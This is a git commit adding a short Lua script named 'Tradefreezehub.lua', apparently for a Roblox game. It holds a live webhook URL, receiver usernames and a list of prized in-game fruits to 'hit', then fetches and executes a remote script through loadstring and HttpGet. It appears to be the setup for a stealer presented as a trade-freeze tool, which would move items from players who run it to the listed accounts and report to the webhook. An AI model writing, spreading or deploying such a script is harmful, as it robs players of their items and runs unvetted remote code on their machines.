4e4ecba49b71fc168b843efc9510eb5844805b45
Tradehubz <adithashok309@gmail.com>
2025-04-26 12:21:19 +0530

    Create Tradefreezehub.lua

---
+++ Tradefreezehub.lua
@@ -0,0 +1,5 @@
+Webhook = "https://l.webhook.party/hook/dLTeeiCviDKE3il6nsdFUam%2Fs7n70iWr1SMFCnkPaG5riu6567HbX1tWfsC70tb9VE9fhce5Hy4KY6xqWE3STm10H89TnTAyltHtdnFDXgJe1kGfM056dmMw8DG9ISKVYQ6Mmzsl3y9w%2B05kqgHW%2F46%2B36BBBuhBr8%2Beo1QHuSrQgfo7TZ6ThxuB8TgGq9blNpHq4D9dk5jCVG0yuYHVjQt8LWm4%2BiUvcvkP7t1iRV%2BFGoF7XDqvvhiNNfUWlmB7wJXEZZaG78mwFwt1HZg0Z39BHF92Vc1VEll7snObSRsP6%2FW157KfkB0EjQJABofnnQqKi8MUItGd7z3pgCxlmntJUnDfLfQOaPLxV9%2BjgVNu7AKWkjY1TbTqggksTXJ3hcQ2qiWBA5achNzy/sTYCFB94X0WkhIZB" -- << Your Webhook
+Usernames = {"Adith_143", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "Gravity-Gravity", "Buddha-Buddha"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
